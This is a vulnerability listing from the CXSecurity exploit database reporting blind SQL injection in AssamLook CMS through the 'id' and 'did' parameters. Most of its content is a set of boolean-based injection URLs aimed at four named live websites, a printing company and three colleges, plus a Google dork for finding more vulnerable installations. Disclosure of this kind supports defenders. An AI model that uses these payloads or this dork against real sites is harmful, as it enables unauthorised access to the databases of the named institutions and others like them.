---
title: AssamLook CMS - Blind SQL Injection Vulnerabilities
url: https://cxsecurity.com/issue/WLB-2025050006
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-05-02
fetch_date: 2025-10-06T22:27:14.420945
---

# AssamLook CMS - Blind SQL Injection Vulnerabilities

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AssamLook CMS - Blind SQL Injection Vulnerabilities** **2025.05.01**  **![us](https://cert.cx/cxstatic/images/flags/us.png) [Mr\_Amir\_Typer](https://cxsecurity.com/author/Mr_Amir_Typer/1/) **(US)** ![us](https://cert.cx/cxstatic/images/flags/us.png)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A**  **[**Dork:** intext:"Powered By Assamlook.com"](https://cxsecurity.com/dorks/)** | |

\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
# Exploit Title: AssamLook CMS - Blind SQL Injection Vulnerabilities
# Date: 2025-04-30
# Exploit Author: AmirHossein Abdollahi | Mr\_Amir\_Typer
# Google Dork: intext:"Powered By Assamlook.com"
# Category: WebApps
# Tested On: Windows, Firefox
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
[+] Vulnerable Parameter: `id` or `did` in URLs with `.php?id=` or `.php?did=`
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
### Demo 1:
https://rhinoprintopacks.com/product.php?id=53' and 1=1--+
https://rhinoprintopacks.com/product.php?id=53' and 1=2--+
### Demo 2:
https://www.nonoicollege.in/department-profile.php?did=1' and 1=1--+
https://www.nonoicollege.in/department-profile.php?did=1' and 1=2--+
### Demo 3:
https://rahacollege.co.in/department-profile.php?did=3' and 1=1--+
https://rahacollege.co.in/department-profile.php?did=3' and 1=2--+
### Demo 4:
https://www.lumdingcollege.org/view\_tender.php?id=108' and 1=1--+
https://www.lumdingcollege.org/view\_tender.php?id=108' and 1=2--+
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
[+] Google Dork:
intext:"Powered By Assamlook.com"
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
# Discovered by: AmirHossein Abdollahi | Mr\_Amir\_Typer

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025050006)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top